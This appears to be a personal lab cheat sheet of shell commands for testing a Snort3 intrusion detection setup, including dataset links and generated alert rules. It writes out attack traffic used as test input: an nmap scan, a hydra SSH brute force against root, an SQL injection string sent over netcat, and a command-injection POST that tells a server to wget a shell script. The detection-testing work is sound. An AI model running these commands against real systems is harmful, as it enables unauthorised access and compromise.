# Ping Sweep Test
```bash
for i in {1..15}; do ping -c 1 192.168.1.44; done
```

# Nmap test
```bash
sudo nmap -sF 192.168.1.44
```

# SSH Brute Force
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 5 ssh://192.168.1.44
```

# Read live log in terminal
```bash
sudo tail -f /var/log/snort/alert_fast.txt
```

# Start snort
```bash
sudo snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules -i eth0 -k none -l /var/log/snort
```

# Install scikit-learn
```bash
sudo apt-get install python3-sklearn python3-sklearn-lib python-sklearn-doc
```

# Run Llama 3 with Ollama
```bash
ollama run llama3
```
# View live log on Mint machine (from Kali)
```bash
sudo tail -f /var/log/snort_alerts.log
```

# CIC-IDS-2017 Dataset
http://cicresearch.ca/CICDataset/CIC-IDS-2017/Dataset/

# Log File Permissions
```bash
sudo chown syslog:adm /var/log/snort_alerts.log
sudo chmod 640 /var/log/snort_alerts.log
sudo systemctl restart rsyslog
```

# Run Snort with PCAP directory
```bash
sudo snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules --pcap-dir=/home/kali/pcap -k none -l /var/log/snort
```

# Send via UDP to port 3306 (MySQL default)
```bash
echo "admin' UNION SELECT 1, database(), user() --" | nc -u 192.168.1.6 3306
```

Note: The rules generated from this command had the correct syntax, which allowed Snort3 to reload properly.

```text
alert udp any any -> $HOME_NET 3306 (msg:"MySQL Admin Password Guess Attempt"; content:"admin' UNION SELECT 1, database(), user() -- "; sid:1764804710; rev:1;)
```

This command was run to successfully validate the attack:
```bash
python3 validate_attack.py --sid 1764804710 --cmd "echo \"admin' UNION SELECT 1, database(), user() -- \" | nc -u 192.168.1.44 3306"
```

# Malicious Payload Test
```bash
curl -X POST -d "cmd=wget http://192.168.1.44/shell.sh" http://192.168.1.6:80/upload.php
```

Run this on the Mint machine first:
```bash
sudo nc -lvnp 80
```

This gives an alert and generates this rule:
```text
alert tcp any any -> $HOME_NET 80 (content:"POST /upload.php HTTP/1.1\r\nHost: 192.168.1.6\r\nUser-Agent: curl/8.17.0\r\nAccept: */*\r\nContent-Length: "; msg:"Malicious Payload"; sid:1764805818; rev:1;)
```

Note: This uses the proper syntax and allows Snort3 to reload properly.